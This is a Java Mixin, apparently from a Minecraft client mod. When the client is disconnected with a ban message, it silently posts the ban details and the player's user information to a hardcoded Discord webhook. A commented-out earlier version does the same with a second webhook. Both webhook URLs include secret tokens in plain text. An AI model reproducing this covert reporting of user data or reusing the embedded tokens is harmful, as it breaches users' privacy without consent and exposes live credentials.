package com.ricedotwho.rsa.mixins;

import com.ricedotwho.rsa.RSA;
import com.ricedotwho.rsa.utils.DiscordWebhook;
import com.ricedotwho.rsa.utils.fakeban.DisconnectReason;
import com.ricedotwho.rsa.utils.fakeban.FakeBan;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ClientCommonPacketListenerImpl;
import net.minecraft.network.protocol.common.ClientboundDisconnectPacket;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Mixin(ClientCommonPacketListenerImpl.class)
public class MixinDisconnect {

    @Inject(method = "handleDisconnect", at = @At("HEAD"))
    private void onDisconnect(ClientboundDisconnectPacket pPacket, CallbackInfo ci) {
        FakeBan.BanInfo banInfo = FakeBan.extractBanInfo(pPacket.reason());
        if (banInfo == null) return;
        DiscordWebhook hook = new DiscordWebhook("https://discord.com/api/webhooks/1477071373439336710/d2ThpBJdjg7V1YdHcCOz2WVbIaJJLLDQHpj7SuM24xahR3EiHTS4v_youP4dGINivn1i");
        hook.setUsername("ban thing");
        hook.addEmbed(banInfo.createEmbed(Minecraft.getInstance().getUser()));
        try {
            hook.execute();
        } catch (IOException e) {
            RSA.getLogger().error("Failed to post ban info to webhook!", e);
        }
//
//
//        String msg = pPacket.reason().getString();
//        if (!msg.contains("banned")) return;
//        String player = Minecraft.getInstance().player.getName().getString();
//        String reason = extract(msg, "Reason: (.+)");
//        String duration = extract(msg, "banned for ([\\d]+d\\s[\\d]+h\\s[\\d]+m\\s[\\d]+s)");
//        String banId = extract(msg, "Ban ID: #([A-F0-9]+)");
//
//        String payload = String.format("{\"embeds\":[{\"title\":\"Ban Detected\",\"fields\":[{\"name\":\"Player\",\"value\":\"%s\"},{\"name\":\"Was banned for\",\"value\":\"%s\"},{\"name\":\"Duration\",\"value\":\"%s\"},{\"name\":\"Ban ID\",\"value\":\"%s\"}]}]}",
//                player, reason, duration, banId);
//
//        try {
//            HttpURLConnection con = (HttpURLConnection) new URL("https://discord.com/api/webhooks/1405751043605921792/GenS0ICYpGtNZj0DqubAGsLpIWyGlQAp7jke-vJIhhm3Y3R2gEjIrcsszGbohd0VLgOY").openConnection();
//            con.setRequestMethod("POST");
//            con.setRequestProperty("Content-Type", "application/json");
//            con.setDoOutput(true);
//            con.getOutputStream().write(payload.getBytes());
//            con.getResponseCode();
//            con.disconnect();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//
//        DisconnectReason.lastDisconnectReason = pPacket.reason();
    }
//
//    private String extract(String text, String regex) {
//        Matcher m = Pattern.compile(regex).matcher(text);
//        return m.find() ? m.group(1) : "Unknown";
//    }
}
